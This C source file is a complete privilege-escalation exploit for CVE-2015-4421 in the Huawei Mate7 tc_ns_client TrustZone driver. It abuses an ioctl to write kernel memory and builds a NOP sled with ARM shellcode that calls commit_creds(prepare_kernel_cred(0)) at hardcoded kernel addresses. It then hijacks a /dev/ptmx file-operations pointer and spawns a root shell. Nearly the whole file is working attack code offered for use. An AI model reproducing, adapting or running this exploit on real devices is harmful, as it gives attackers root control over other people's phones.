/* 
	tc_ns_client-pwn
	CVE-2015-4421 exploit for Huawei Mate7
	author: fwang12@ncsu.edu
*/

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#define TC_NS_CLIENT_IOC_MAGIC  't'

enum TEEC_ParamType {
        TEEC_NONE = 0x0,
        TEEC_VALUE_INPUT = 0x01,
        TEEC_VALUE_OUTPUT = 0x02,
        TEEC_VALUE_INOUT = 0x03,
        TEEC_MEMREF_TEMP_INPUT = 0x05,
        TEEC_MEMREF_TEMP_OUTPUT = 0x06,
        TEEC_MEMREF_TEMP_INOUT = 0x07,
        TEEC_MEMREF_WHOLE = 0xc,
        TEEC_MEMREF_PARTIAL_INPUT = 0xd,
        TEEC_MEMREF_PARTIAL_OUTPUT = 0xe,
        TEEC_MEMREF_PARTIAL_INOUT = 0xf
};

enum global_service_cmd_id {
    GLOBAL_CMD_ID_INVALID = 0x0,
    GLOBAL_CMD_ID_BOOT_ACK,
    GLOBAL_CMD_ID_OPEN_SESSION,
    GLOBAL_CMD_ID_CLOSE_SESSION,
    GLOBAL_CMD_ID_LOAD_SECURE_APP,  
    GLOBAL_CMD_ID_NEED_LOAD_APP,    
    GLOBAL_CMD_ID_REGISTER_AGENT,
    GLOBAL_CMD_ID_UNREGISTER_AGENT,
    GLOBAL_CMD_ID_REGISTER_NOTIFY_MEMORY,
    GLOBAL_CMD_ID_UNREGISTER_NOTIFY_MEMORY,
    GLOBAL_CMD_ID_INIT_CONTENT_PATH,        
    GLOBAL_CMD_ID_TERMINATE_CONTENT_PATH,  
    GLOBAL_CMD_ID_ALLOC_EXCEPTION_MEM,
    GLOBAL_CMD_ID_TEE_TIME,
    GLOBAL_CMD_ID_UNKNOWN         = 0x7FFFFFFE,
    GLOBAL_CMD_ID_MAX             = 0x7FFFFFFF
};
enum TEE_ParamType {
    TEE_PARAM_TYPE_NONE = 0x0,
    TEE_PARAM_TYPE_VALUE_INPUT = 0x1,
    TEE_PARAM_TYPE_VALUE_OUTPUT = 0x2,
    TEE_PARAM_TYPE_VALUE_INOUT = 0x3,
    TEE_PARAM_TYPE_MEMREF_INPUT = 0x5,
    TEE_PARAM_TYPE_MEMREF_OUTPUT = 0x6,
    TEE_PARAM_TYPE_MEMREF_INOUT = 0x7,
};

typedef struct {
	unsigned int method;
	unsigned int mdata;
} TC_NS_ClientLogin;

typedef union {
	struct {
		unsigned int buffer;
		unsigned int offset;
		unsigned int size_addr;
	} memref;
	struct {
		unsigned int a_addr;
		unsigned int b_addr;
	} value;
} TC_NS_ClientParam;

typedef struct {
	unsigned int code;
	unsigned int origin;
} TC_NS_ClientReturn;

typedef struct {
	unsigned char uuid[16];
	unsigned int session_id;
	unsigned int cmd_id;
	TC_NS_ClientReturn returns;
	TC_NS_ClientLogin login;
	unsigned int paramTypes; 
	TC_NS_ClientParam params[4];
	bool started;
} TC_NS_ClientContext;

#define TC_NS_CLIENT_IOCTL_SES_OPEN_REQ \
	_IOW(TC_NS_CLIENT_IOC_MAGIC, 1, TC_NS_ClientContext)
#define TC_NS_CLIENT_IOCTL_SEND_CMD_REQ \
	_IOWR(TC_NS_CLIENT_IOC_MAGIC, 3, TC_NS_ClientContext)

#define TEEC_PARAM_TYPES( param0Type, param1Type, param2Type, param3Type) \
    ((param3Type) << 12 | (param2Type) << 8 | (param1Type) << 4 | (param0Type))

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;


static void shellcode(void)
{
	commit_creds = 0xc0651050;
	prepare_kernel_cred = 0xc065150c;
	commit_creds(prepare_kernel_cred(0));
}
static unsigned long assemble[] = { 
	0xe1a0c00d,	// mov r12, sp
	0xe92dd240,	// push {r6, r9, r12, lr, pc}
	0xe59f600c,	// ldr r6, [pc, #12]		; FIXME_FUNC_GET_ROOT
	0xe12fff36,	// blx r6
	0xe89da240,	// ldmia sp, {r6, r9, sp, pc}
	0x01000100,	// mrseq r0, cpsr
	0xe1a00000,	// mov r0, r0
	shellcode,
};

int test(int fd, TC_NS_ClientContext *client_context)
{
	client_context->paramTypes = TEEC_VALUE_OUTPUT;
	client_context->cmd_id = GLOBAL_CMD_ID_TEE_TIME;
	int a = 3 ; int ret;
	client_context->params[0].value.a_addr = &a+1;
	client_context->params[0].value.b_addr = &a;
	*(unsigned int *)client_context->params[0].value.b_addr = 0;
	client_context->started = 0;

while(((( *(unsigned int *)client_context->params[0].value.b_addr < 0x00010000) || ( *(unsigned int *)client_context->params[0].value.b_addr > 0x0fff0000))) || (*(unsigned int *)client_context->params[0].value.b_addr % 4096 != 0))
{
	printf("----- First Call -----\n");
//	printf("--- check : %p %p %p %p \n", *(unsigned int *)a1, *(unsigned int *)a2,*(unsigned int *)a3,*(unsigned int *)a2=4);
	printf("before : %x(%p) %x(%p) %x %x %x\n", client_context->params[0].value.a_addr, *(unsigned int *)client_context->params[0].value.a_addr, client_context->params[0].value.b_addr, *(unsigned int *)client_context->params[0].value.b_addr, client_context->login.mdata, client_context->login.method, client_context->returns.origin);
	ret = ioctl(fd, TC_NS_CLIENT_IOCTL_SEND_CMD_REQ, client_context);
	if(ret < 0) 
	{
		printf("[-] TC_NS_CLIENT_IOCTL_SEND_CMD_REQ failed (%s)\n", strerror(errno));
//		goto close_out;
	}
	else printf("[+] TC_NS_CLIENT_IOCTL_SEND_CMD_REQ done (%d)\n", client_context->returns.code);
	printf("after  : %x(%p) %x(%p) %x %x %x\n", client_context->params[0].value.a_addr, *(unsigned int *)client_context->params[0].value.a_addr, client_context->params[0].value.b_addr, *(unsigned int *)client_context->params[0].value.b_addr, client_context->login.mdata, client_context->login.method, client_context->returns.origin);
//	printf("--- check : %p %p %p %p \n", *(unsigned int *)a1, *(unsigned int *)a2,*(unsigned int *)a3,*(unsigned int *)a2=4);
}
	printf("\n\n\n");

	int temp = *(unsigned int *)client_context->params[0].value.b_addr;
	void* addr = mmap(temp, 40960, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);

	int *arr = (int *) addr;
	int i;
	for(i = 0; i < 10240; i ++)	arr[i] = 0xe1a00000; //NOP

	printf("temp is %p  ----- mmap return %p (%d) (%s)\n\n\n",temp, arr, arr, strerror(errno));
	for(i = 10230; i < 10238; i++)
	{
		arr[i] = assemble[i - 10230];
		printf("%p(%p), ", arr[i], assemble[i-10230]);
	}

//static void (*func)();
//func = temp;
//(*func)();

	client_context->cmd_id = GLOBAL_CMD_ID_TEE_TIME;
	client_context->paramTypes = TEEC_VALUE_OUTPUT;
	client_context->params[0].value.a_addr = 0xc1498e04 + 15*4;
	client_context->params[0].value.b_addr = 0xc1498e04 + 14*4;
        client_context->started = 0;

        printf("----- Second Call -----\n");
        ret = ioctl(fd, TC_NS_CLIENT_IOCTL_SEND_CMD_REQ, client_context);
        if(ret < 0)
        {
                printf("[-] TC_NS_CLIENT_IOCTL_SEND_CMD_REQ failed (%s)\n", strerror(errno));
//              goto close_out;
        }
        else printf("[+] TC_NS_CLIENT_IOCTL_SEND_CMD_REQ done (%d)\n", client_context->returns.code);
close_out:
        close(fd);
}
main()
{
	int fd = open("/dev/tc_ns_client", O_RDONLY);
	TC_NS_ClientContext client_context;

	if ( fd < 0 ) {
		printf("[-] failed to open device (%s)\n", strerror(errno));
		goto out;
	}
	printf("[+] device opened @ %d\n", fd);

	memset(&client_context, 0, sizeof(client_context));
	client_context.cmd_id = GLOBAL_CMD_ID_OPEN_SESSION;
	client_context.started = 0;
	if ( ioctl(fd, TC_NS_CLIENT_IOCTL_SES_OPEN_REQ, &client_context) ) {
		printf("[-] TC_NS_CLIENT_IOCTL_SES_OPEN_REQ failed (%s)\n", strerror(errno));
		goto close_out;
	}
	printf("[+] TC_NS_CLIENT_IOCTL_SES_OPEN_REQ done (%d)\n", 
			client_context.returns.code);

	if ( client_context.returns.code )
		goto close_out;

	test(fd, &client_context);

//	printf("Call ptmx fops.\n");
	int ptmc_fd;
	ptmc_fd = open("/dev/ptmx", O_RDONLY);
//	printf("Open optmx.\n");
	fsync(ptmc_fd);
//	printf("Fsync optmx.\n");
	if(getuid()==0) {
		printf("[+] escalate \n");
		execl("/system/bin/sh", "/system/bin/sh", NULL);
	}else {
		printf("[-] escalate failed (uid %d euid %d)\n", getuid(), geteuid());
	}

close_out:
	close(fd);
	close(ptmc_fd);
out:
	return 0;
}
